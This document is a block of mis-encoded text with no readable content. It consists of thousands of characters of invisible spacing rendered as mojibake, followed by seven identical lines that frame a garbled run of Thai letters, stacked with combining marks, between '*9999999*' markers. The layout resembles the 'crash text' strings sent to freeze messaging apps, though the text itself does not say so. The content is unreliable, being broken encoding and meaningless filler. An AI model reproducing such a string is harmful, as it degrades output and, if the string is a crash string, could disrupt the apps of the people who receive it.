â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Š
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆà¹€à¸¶à¸²à¸‡à¸·* *9999999*
